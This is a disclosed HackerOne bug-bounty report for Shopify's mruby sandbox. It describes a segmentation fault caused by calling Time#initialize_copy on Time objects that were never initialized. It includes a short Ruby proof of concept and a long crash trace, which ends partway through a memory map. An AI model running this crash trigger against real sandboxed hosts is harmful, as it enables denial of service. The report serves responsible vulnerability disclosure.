{"id":184661,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODQ2NjE=","url":"https://hackerone.com/reports/184661","title":"mruby-time: Crash host with uninitialized Time obj","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2016-11-23T22:28:00.444Z","submitted_at":"2016-11-23T22:28:00.444Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"brakhane","url":"/brakhane","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/040/726/4b47d99eec4ee906a402afb934855158d1e6d929_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-12-16T22:19:43.205Z","bug_reporter_agreed_on_going_public_at":"2016-12-16T22:19:43.156Z","team_member_agreed_on_going_public_at":"2016-12-16T20:20:38.453Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"So once again, another try ;) (As always hopefully unknown and valid ;))\n\n`Time::initialize_copy` performs its copy action even on `Time` objects on which `initialize` never ran, leading to a crash. \n\nThe PoC crashes https://www.mruby.science/runs - didn't try Shopify production servers for the usual reasons.\n\nAs a sidenote: Matz has patched a memory leak in the `mruby-time` here: https://github.com/mruby/mruby/commit/d97a37eb7b4fe52bb1b16bb6f7410fbae85e3809 You probably want to pull this into your copy of mruby-time as this has the potential (not tested) to slowly eat up memory if this condition is hit on purpose. I didn't want to create its own bugreport for this as it's kind of minor and already known upstream.\n\n# PoC\n```\nclass Time\n  def initialize\n  end\nend\n\na = Time.new\nb = Time.new\na.initialize_copy b\n```\n\n# Traces\n\nThis can't be ran from the irb as the implicit printout will fail (without crashing), running it in the sandbox leads to the shown results:\n\n```\n$ bin/sandbox /tmp/test.mrb \nbin/sandbox:20: [BUG] Segmentation fault at 0x00000000000000\nruby 2.3.2p217 (2016-11-15 revision 56796) [x86_64-linux]\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\nc:0002 p:0201 s:0005 E:002238 EVAL   bin/sandbox:20 [FINISH]\nc:0001 p:0000 s:0002 E:0018c0 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\nbin/sandbox:20:in `\u003cmain\u003e'\nbin/sandbox:20:in `sandbox_eval'\n\n-- Machine register context ------------------------------------------------\n RIP: 0x00007f5119cba5d3 RBP: 0x00007f51187f14e0 RSP: 0x00007f51187efab0\n RAX: 0x00007f51188144a0 RBX: 0x00007f51187f94f0 RCX: 0x0000000000000000\n RDX: 0x0000000000000000 RDI: 0x0000000055504410 RSI: 0x00007f5119f29c10\n  R8: 0x00007f51187f94c0  R9: 0x0000000000000001 R10: 0x0000000000000177\n R11: 0x00007f5119cb0f60 R12: 0x00007f51187f94f0 R13: 0x000000000000004d\n R14: 0x00007f51187f14e0 R15: 0x00007f51187f1f60 EFL: 0x0000000000010246\n\n-- C level backtrace information -------------------------------------------\n/usr/lib/libruby.so.2.3 [0x7f511dd49425]\n/usr/lib/libruby.so.2.3 [0x7f511dd4965c]\n/usr/lib/libruby.so.2.3 [0x7f511dc23e34]\n/usr/lib/libruby.so.2.3 [0x7f511dcd56ce]\n/usr/lib/libc.so.6 [0x7f511d8490b0]\n/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_time_initialize_copy+0x73) [0x7f5119cba5d3] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-time/src/time.c:533\n/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x75f) [0x7f5119c79dbf] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f5119c7f607] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7f5119c60613] ../../../../ext/mruby_engine/eval_monitored.c:68\n/usr/lib/libpthread.so.0(start_thread+0xc4) [0x7f511d600454]\n/usr/lib/libc.so.6(clone+0x5f) [0x7f511d8fe7df]\n\n-- Other runtime information -----------------------------------------------\n\n* Loaded script: bin/sandbox\n\n* Loaded features:\n\n    0 enumerator.so\n    1 thread.rb\n    2 rational.so\n    3 complex.so\n    4 /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n    5 /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n    6 /usr/lib/ruby/2.3.0/unicode_normalize.rb\n    7 /usr/lib/ruby/2.3.0/x86_64-linux/rbconfig.rb\n    8 /usr/lib/ruby/2.3.0/rubygems/compatibility.rb\n    9 /usr/lib/ruby/2.3.0/rubygems/defaults.rb\n   10 /usr/lib/ruby/2.3.0/rubygems/deprecate.rb\n   11 /usr/lib/ruby/2.3.0/rubygems/errors.rb\n   12 /usr/lib/ruby/2.3.0/rubygems/version.rb\n   13 /usr/lib/ruby/2.3.0/rubygems/requirement.rb\n   14 /usr/lib/ruby/2.3.0/rubygems/platform.rb\n   15 /usr/lib/ruby/2.3.0/rubygems/basic_specification.rb\n   16 /usr/lib/ruby/2.3.0/rubygems/stub_specification.rb\n   17 /usr/lib/ruby/2.3.0/rubygems/util/list.rb\n   18 /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n   19 /usr/lib/ruby/2.3.0/rubygems/specification.rb\n   20 /usr/lib/ruby/2.3.0/rubygems/exceptions.rb\n   21 /usr/lib/ruby/2.3.0/rubygems/dependency.rb\n   22 /usr/lib/ruby/2.3.0/rubygems/core_ext/kernel_gem.rb\n   23 /usr/lib/ruby/2.3.0/monitor.rb\n   24 /usr/lib/ruby/2.3.0/rubygems/core_ext/kernel_require.rb\n   25 /usr/lib/ruby/2.3.0/rubygems.rb\n   26 /usr/lib/ruby/2.3.0/rubygems/path_support.rb\n   27 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/version.rb\n   28 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/core_ext/name_error.rb\n   29 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/levenshtein.rb\n   30 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/jaro_winkler.rb\n   31 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkable.rb\n   32 /usr/lib/ruby/2.3.0/delegate.rb\n   33 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers/class_name_checker.rb\n   34 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers/variable_name_checker.rb\n   35 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers.rb\n   36 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/method_name_checker.rb\n   37 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/null_checker.rb\n   38 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/formatter.rb\n   39 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean.rb\n   40 /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n   41 /usr/lib/ruby/2.3.0/pathname.rb\n   42 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/postit_trampoline.rb\n   43 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/constants.rb\n   44 /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n   45 /usr/lib/ruby/2.3.0/rubygems/user_interaction.rb\n   46 /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n   47 /usr/lib/ruby/2.3.0/rubygems/config_file.rb\n   48 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/rubygems_integration.rb\n   49 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/current_ruby.rb\n   50 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/shared_helpers.rb\n   51 /usr/lib/ruby/2.3.0/fileutils.rb\n   52 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/errors.rb\n   53 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/environment_preserver.rb\n   54 /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n   55 /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n   56 /usr/lib/ruby/2.3.0/socket.rb\n   57 /usr/lib/ruby/2.3.0/timeout.rb\n   58 /usr/lib/ruby/2.3.0/net/protocol.rb\n   59 /usr/lib/ruby/2.3.0/uri/rfc2396_parser.rb\n   60 /usr/lib/ruby/2.3.0/uri/rfc3986_parser.rb\n   61 /usr/lib/ruby/2.3.0/uri/common.rb\n   62 /usr/lib/ruby/2.3.0/uri/generic.rb\n   63 /usr/lib/ruby/2.3.0/uri/ftp.rb\n   64 /usr/lib/ruby/2.3.0/uri/http.rb\n   65 /usr/lib/ruby/2.3.0/uri/https.rb\n   66 /usr/lib/ruby/2.3.0/uri/ldap.rb\n   67 /usr/lib/ruby/2.3.0/uri/ldaps.rb\n   68 /usr/lib/ruby/2.3.0/uri/mailto.rb\n   69 /usr/lib/ruby/2.3.0/uri.rb\n   70 /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n   71 /usr/lib/ruby/2.3.0/net/http/exceptions.rb\n   72 /usr/lib/ruby/2.3.0/net/http/header.rb\n   73 /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n   74 /usr/lib/ruby/2.3.0/net/http/generic_request.rb\n   75 /usr/lib/ruby/2.3.0/net/http/request.rb\n   76 /usr/lib/ruby/2.3.0/net/http/requests.rb\n   77 /usr/lib/ruby/2.3.0/net/http/response.rb\n   78 /usr/lib/ruby/2.3.0/net/http/responses.rb\n   79 /usr/lib/ruby/2.3.0/net/http/proxy_delta.rb\n   80 /usr/lib/ruby/2.3.0/net/http/backward.rb\n   81 /usr/lib/ruby/2.3.0/net/http.rb\n   82 /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n   83 /usr/lib/ruby/2.3.0/date.rb\n   84 /usr/lib/ruby/2.3.0/time.rb\n   85 /usr/lib/ruby/2.3.0/rubygems/request/http_pool.rb\n   86 /usr/lib/ruby/2.3.0/rubygems/request/https_pool.rb\n   87 /usr/lib/ruby/2.3.0/rubygems/request/connection_pools.rb\n   88 /usr/lib/ruby/2.3.0/rubygems/request.rb\n   89 /usr/lib/ruby/2.3.0/cgi/core.rb\n   90 /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n   91 /usr/lib/ruby/2.3.0/cgi/util.rb\n   92 /usr/lib/ruby/2.3.0/cgi/cookie.rb\n   93 /usr/lib/ruby/2.3.0/cgi.rb\n   94 /usr/lib/ruby/2.3.0/rubygems/uri_formatter.rb\n   95 /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n   96 /usr/lib/ruby/2.3.0/digest.rb\n   97 /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n   98 /usr/lib/ruby/2.3.0/openssl/bn.rb\n   99 /usr/lib/ruby/2.3.0/openssl/pkey.rb\n  100 /usr/lib/ruby/2.3.0/openssl/cipher.rb\n  101 /usr/lib/ruby/2.3.0/openssl/config.rb\n  102 /usr/lib/ruby/2.3.0/openssl/digest.rb\n  103 /usr/lib/ruby/2.3.0/openssl/x509.rb\n  104 /usr/lib/ruby/2.3.0/openssl/buffering.rb\n  105 /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n  106 /usr/lib/ruby/2.3.0/openssl/ssl.rb\n  107 /usr/lib/ruby/2.3.0/openssl.rb\n  108 /usr/lib/ruby/2.3.0/securerandom.rb\n  109 /usr/lib/ruby/2.3.0/resolv.rb\n  110 /usr/lib/ruby/2.3.0/rubygems/remote_fetcher.rb\n  111 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/gem_remote_fetcher.rb\n  112 /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n  113 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/plugin/api/source.rb\n  114 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/plugin/api.rb\n  115 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/plugin.rb\n  116 /usr/lib/ruby/2.3.0/rubygems/util.rb\n  117 /usr/lib/ruby/2.3.0/rubygems/source/git.rb\n  118 /usr/lib/ruby/2.3.0/rubygems/source/installed.rb\n  119 /usr/lib/ruby/2.3.0/rubygems/source/specific_file.rb\n  120 /usr/lib/ruby/2.3.0/rubygems/source/local.rb\n  121 /usr/lib/ruby/2.3.0/rubygems/source/lock.rb\n  122 /usr/lib/ruby/2.3.0/rubygems/source/vendor.rb\n  123 /usr/lib/ruby/2.3.0/rubygems/source.rb\n  124 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/gem_helpers.rb\n  125 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/match_platform.rb\n  126 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/rubygems_ext.rb\n  127 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/version.rb\n  128 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler.rb\n  129 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/settings.rb\n  130 /usr/lib/ruby/2.3.0/rubygems/ext/build_error.rb\n  131 /usr/lib/ruby/2.3.0/rubygems/ext/builder.rb\n  132 /usr/lib/ruby/2.3.0/rubygems/ext/configure_builder.rb\n  133 /usr/lib/ruby/2.3.0/tmpdir.rb\n  134 /usr/lib/ruby/2.3.0/tempfile.rb\n  135 /usr/lib/ruby/2.3.0/rubygems/ext/ext_conf_builder.rb\n  136 /usr/lib/ruby/2.3.0/rubygems/ext/rake_builder.rb\n  137 /usr/lib/ruby/2.3.0/optparse.rb\n  138 /usr/lib/ruby/2.3.0/rubygems/command.rb\n  139 /usr/lib/ruby/2.3.0/rubygems/ext/cmake_builder.rb\n  140 /usr/lib/ruby/2.3.0/rubygems/ext.rb\n  141 /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n  142 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source.rb\n  143 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/path.rb\n  144 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/git.rb\n  145 /usr/lib/ruby/2.3.0/rubygems/text.rb\n  146 /usr/lib/ruby/2.3.0/rubygems/name_tuple.rb\n  147 /usr/lib/ruby/2.3.0/rubygems/spec_fetcher.rb\n  148 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/rubygems.rb\n  149 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/lockfile_parser.rb\n  150 /usr/lib/ruby/2.3.0/set.rb\n  151 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/definition.rb\n  152 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/dependency.rb\n  153 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ruby_dsl.rb\n  154 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/dsl.rb\n  155 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source_list.rb\n  156 /home/simon/git/shopify/mruby-engine/lib/mruby_engine/version.rb\n  157 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/index.rb\n  158 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/gemspec.rb\n  159 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/lazy_specification.rb\n  160 /usr/lib/ruby/2.3.0/tsort.rb\n  161 /usr/lib/ruby/2.3.0/forwardable.rb\n  162 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/spec_set.rb\n  163 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/gem_version_promoter.rb\n  164 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/runtime.rb\n  165 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ui.rb\n  166 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ui/silent.rb\n  167 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ui/rg_proxy.rb\n  168 /usr/lib/ruby/2.3.0/rubygems/util/licenses.rb\n  169 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/remote_specification.rb\n  170 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/dep_proxy.rb\n  171 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/gem_metadata.rb\n  172 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/errors.rb\n  173 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/action.rb\n  174 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/add_edge_no_circular.rb\n  175 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/add_vertex.rb\n  176 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/detach_vertex_named.rb\n  177 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/set_payload.rb\n  178 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/tag.rb\n  179 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/log.rb\n  180 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/vertex.rb\n  181 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph.rb\n  182 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/state.rb\n  183 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/modules/specification_provider.rb\n  184 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/delegates/resolution_state.rb\n  185 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/delegates/specification_provider.rb\n  186 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/resolution.rb\n  187 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/resolver.rb\n  188 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/modules/ui.rb\n  189 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo.rb\n  190 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendored_molinillo.rb\n  191 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/resolver.rb\n  192 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/endpoint_specification.rb\n  193 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/stub_specification.rb\n  194 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/setup.rb\n  195 /usr/lib/ruby/2.3.0/json/version.rb\n  196 /usr/lib/ruby/2.3.0/ostruct.rb\n  197 /usr/lib/ruby/2.3.0/json/generic_object.rb\n  198 /usr/lib/ruby/2.3.0/json/common.rb\n  199 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n  200 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n  201 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n  202 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n  203 /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n  204 /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n  205 /usr/lib/ruby/2.3.0/json/ext.rb\n  206 /usr/lib/ruby/2.3.0/json.rb\n  207 /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n  208 /home/simon/git/shopify/mruby-engine/lib/mruby_engine.rb\n\n* Process memory map:\n\n00400000-00401000 r-xp 00000000 08:03 948906                             /usr/bin/ruby\n00600000-00601000 r--p 00000000 08:03 948906                             /usr/bin/ruby\n00601000-00602000 rw-p 00001000 08:03 948906                             /usr/bin/ruby\n0171f000-0282e000 rw-p 00000000 00:00 0                                  [heap]\n7f5110000000-7f5110021000 rw-p 00000000 00:00 0 \n7f5110021000-7f5114000000 ---p 00000000 00:00 0 \n7f5117554000-7f5117980000 r--s 00000000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n7f5117980000-7f5117b5d000 r--s 00000000 08:03 934952                     /usr/lib/libc-2.24.so\n7f5117b5d000-7f5117dd9000 r--s 00000000 08:03 936071                     /usr/lib/libruby.so.2.3.0\n7f5117dd9000-7f5117def000 r-xp 00000000 08:03 935430                     /usr/lib/libgcc_s.so.1\n7f5117def000-7f5117fee000 ---p 00016000 08:03 935430                     /usr/lib/libgcc_s.so.1\n7f5117fee000-7f5117fef000 r--p 00015000 08:03 935430                     /usr/lib/libgcc_s.so.1\n7f5117fef000-7f5117ff0000 rw-p 00016000 08:03 935430                     /usr/lib/libgcc_s.so.1\n7f5117ff0000-7f5117ff1000 ---p 00000000 00:00 0 \n7f5117ff1000-7f5118bf1000 rw-p 00000000 00:00 0 \n7f5118bf1000-7f5118bf8000 r-xp 00000000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n7f5118bf8000-7f5118df8000 ---p 00007000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n7f5118df8000-7f5118df9000 r--p 00007000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n7f5118df9000-7f5118dfa000 rw-p 00008000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n7f5118dfa000-7f5118dfb000 r-xp 00000000 08:03 948491                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n7f5118dfb000-7f5118ffa000 ---p 00001000 08:03 948491                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n7f5118ffa000-7f5118ffb000 r--p 00000000 08:03 948491                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n7f5118ffb000-7f5118ffc000 rw-p 00001000 08:03 948491                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n7f5118ffc000-7f5118ffd000 r-xp 00000000 08:03 948495                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n7f5118ffd000-7f51191fc000 ---p 00001000 08:03 948495                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n7f51191fc000-7f51191fd000 r--p 00000000 08:03 948495                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n7f51191fd000-7f51191fe000 rw-p 00001000 08:03 948495                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n7f51191fe000-7f51191ff000 r-xp 00000000 08:03 948510                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n7f51191ff000-7f51193ff000 ---p 00001000 08:03 948510                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n7f51193ff000-7f5119400000 r--p 00001000 08:03 948510                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n7f5119400000-7f5119401000 rw-p 00002000 08:03 948510                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n7f5119401000-7f5119402000 r-xp 00000000 08:03 948514                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n7f5119402000-7f5119602000 ---p 00001000 08:03 948514                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n7f5119602000-7f5119603000 r--p 00001000 08:03 948514                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n7f5119603000-7f5119604000 rw-p 00002000 08:03 948514                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n7f5119604000-7f511960a000 r-xp 00000000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n7f511960a000-7f5119809000 ---p 00006000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n7f5119809000-7f511980a000 r--p 00005000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n7f511980a000-7f511980b000 rw-p 00006000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n7f511980b000-7f5119830000 r-xp 00000000 08:03 935807                     /usr/lib/liblzma.so.5.2.2\n7f5119830000-7f5119a2f000 ---p 00025000 08:03 935807                     /usr/lib/liblzma.so.5.2.2\n7f5119a2f000-7f5119a30000 r--p 00024000 08:03 935807                     /usr/lib/liblzma.so.5.2.2\n7f5119a30000-7f5119a31000 rw-p 00025000 08:03 935807                     /usr/lib/liblzma.so.5.2.2\n7f5119a31000-7f5119a3c000 r-xp 00000000 08:03 944077                     /usr/lib/libunwind.so.8.0.1\n7f5119a3c000-7f5119c3b000 ---p 0000b000 08:03 944077                     /usr/lib/libunwind.so.8.0.1\n7f5119c3b000-7f5119c3c000 r--p 0000a000 08:03 944077                     /usr/lib/libunwind.so.8.0.1\n7f5119c3c000-7f5119c3d000 rw-p 0000b000 08:03 944077                     /usr/lib/libunwind.so.8.0.1\n7f5119c3d000-7f5119c4b000 rw-p 00000000 00:00 0 \n7f5119c4b000-7f5119d29000 r-xp 00000000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n7f5119d29000-7f5119f28000 ---p 000de000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n7f5119f28000-7f5119f2a000 r--p 000dd000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n7f5119f2a000-7f5119f2c000 rw-p 000df000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n7f5119f2c000-7f5119f31000 r-xp 00000000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n7f5119f31000-7f511a130000 ---p 00005000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n7f511a130000-7f511a131000 r--p 00004000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n7f511a131000-7f511a132000 rw-p 00005000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n7f511a132000-7f511a133000 r-xp 00000000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n7f511a133000-7f511a332000 ---p 00001000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n7f511a332000-7f511a333000 r--p 